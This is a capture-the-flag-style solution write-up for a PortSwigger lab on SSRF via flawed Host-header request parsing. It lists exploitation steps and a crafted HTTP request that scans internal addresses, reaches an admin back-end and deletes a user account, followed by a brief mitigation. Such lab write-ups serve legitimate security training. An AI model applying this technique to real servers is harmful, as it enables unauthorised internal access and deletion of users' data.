# Lab 05 — SSRF via flawed request parsing

> **Practitioner** · [Official lab](https://portswigger.net/web-security/host-header/exploiting/lab-host-header-ssrf-via-flawed-request-parsing)

**Entry point:** Host is validated — but supplying an **absolute URL in the
request line** makes the validator check that instead, while the Host is
used for routing.

## Solution

1. Confirm: `GET https://YOUR-LAB-ID/ HTTP/1.1` + arbitrary `Host:` → no
   block (timeouts on non-resolving values).
2. Verify SSRF with Collaborator in the Host.
3. Intruder-scan `Host: 192.168.0.§0§` → find the admin back-end (302 →
   `/admin`).
4. Append `/admin` to the absolute URL, then delete:

```http
GET https://YOUR-LAB-ID.web-security-academy.net/admin/delete?csrf=<TOKEN>&username=carlos HTTP/1.1
Host: 192.168.0.x
Cookie: <session from the admin response>
```

(convert to POST; copy CSRF/session from the admin page response) —
lab solved.

## Mitigation

Validate the Host **and** the request-line target consistently; normalize
before checking.
